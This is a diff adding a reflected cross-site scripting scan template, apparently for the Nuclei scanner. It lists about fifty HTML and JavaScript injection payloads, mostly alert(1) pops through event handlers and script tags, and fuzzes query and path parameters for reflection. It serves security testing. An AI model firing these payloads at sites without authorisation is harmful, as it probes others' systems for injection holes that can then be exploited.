@@ -1,0 +1,94 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<video onerror=\"javascript:javascript:alert(1);\"></video>"
+        - "<audio autoplay controls ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "</script>alert(1)</script>"
+        - "<script>alert(1)</script>"
+        - "<del draggable=\"true\" ondragleave=\"alert(1)\">test</del>"
+        - "<optgroup draggable=\"true\" ondragenter=\"alert(1)\">test</optgroup>"
+        - "<embed id=x onbeforecopy=\"alert(1)\" contenteditable>test</embed>"
+        - "<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>"
+        - "<video poster=\"http://xssme.html5sec.org/img/xssme.jpg\"></video>"
+        - "<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<plaintext draggable=\"true\" ondragleave=\"alert(1)\">test</plaintext>"
+        - "<input onkeyup=\"alert(1)\" autofocus>"
+        - "<map id=x tabindex=1 onactivate=alert(1)></map>"
+        - "<svg/onload=alert(1)>"
+        - "<nobr draggable=\"true\" ondragleave=\"alert(1)\">test</nobr>"
+        - "<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>"
+        - "<audio autoplay controls><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<svg><script>alert(1)</script></svg>"
+        - "<input type=\"checkbox\" value=\"1\"><img src=x onerror=\"javascript:alert(1);\">"
+        - "<style>@keyframes slidein {}</style><option style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></option>"
+        - "<style>@keyframes slidein {}</style><output style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></output>"
+        - "<IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<noframes onbeforecut=\"alert(1)\" contenteditable>test</noframes>"
+        - "<frameset><frame onmousemove=\"alert(1)\">test</frame></frameset>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input autofocus>"
+        - "<frameset><frame onload=alert(1)"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></output>"
+        - "<SCRIPT>alert('XSS')</SCRIPT>"
+        - "<xmp onkeyup=\"alert(1)\" contenteditable>test</xmp>"
+        - "<style>@keyframes x{}</style><input style=\"animation-name:x\" onanimationend=\"alert(1)\">"
+        - "<script>alert('xss');</script>"
+        - "<svg/onload=alert(1)"
+        - "<svg><style>@keyframes x{}</style><progress style=\"animation-name:x\" onanimationstart=\"alert(1)\"></progress>"
+        - "<IMG SRC=x onchange=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<html ontouchmove=alert(1)></html>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></col>"
+        - "<script>alert(1)</script"
+        - "<video draggable=\"true\" ondragenter=\"alert(1)\">test</video>"
+        - "<frameset draggable=\"true\" ondragend=\"alert(1)\">test</frameset>"
+        - "<multicol onclick=\"alert(1)\">test</multicol>"
+        - "<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>"
+        - "<plaintext onclick=\"alert(1)\">test</plaintext>"
+        - "<col onmouseenter=\"alert(1)\">test</col>"
+        - "<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>"
+        - "<input autofocus>"
+        - "<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>"
+        - "<form><script>alert(1)</script></form>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
